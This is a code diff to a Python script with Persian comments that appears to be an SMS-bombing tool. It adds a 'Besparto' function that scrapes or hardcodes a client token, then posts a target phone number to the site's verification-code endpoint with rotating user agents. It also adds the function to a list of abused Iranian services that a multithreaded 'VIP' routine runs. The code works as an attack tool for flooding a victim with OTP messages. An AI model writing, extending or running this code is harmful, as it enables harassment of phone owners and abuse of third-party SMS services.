@@ -63,6 +63,92 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+
+def Besparto(phone):
+    try:
+        session = requests.Session()
+        
+        # اول صفحه اصلی را بگیریم تا توکن را استخراج کنیم
+        home_response = session.get(
+            "https://besparto.ir/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج Client-Token از صفحه
+        client_token = None
+        token_patterns = [
+            r'Client-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'\$2y\$10\$[a-zA-Z0-9./]+'  # pattern برای توکن های bcrypt
+        ]
+        
+        for pattern in token_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                client_token = match.group(0)  # کل match را بگیریم
+                print(f'{g}[+] Found Client-Token: {client_token}{a}')
+                break
+        
+        if not client_token:
+            # اگر توکن پیدا نشد، از توکن پیشفرض استفاده کنیم
+            client_token = "$2y$10$KH69txfOkqZuhxqF2W1BR.6o0jrrw.X53TH4dMmYfhCDNtwwq/8n6"
+            print(f'{y}[!] Using default Client-Token{a}')
+        
+        # حالا درخواست ارسال کد
+        url = "https://api.besparto.ir/customer/v1/token/"
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Client-Token": client_token,
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://besparto.ir",
+            "Referer": "https://besparto.ir/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone
+        }
+        
+        response = session.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Besparto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Besparto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(Besparto) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Besparto Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(Besparto) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] Besparto HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Besparto Exception: {e}{a}')
+        return False
+
+
+
 def DigikalaJet(phone):
     try:
         url = "https://api.digikalajet.ir/user/login-register/"
@@ -570,7 +656,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [Balad, DigikalaJet, Footini, nillarayeshi, ShahreSandal, SibApp]
+services = [Balad, Besparto, DigikalaJet, Footini, nillarayeshi, ShahreSandal, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
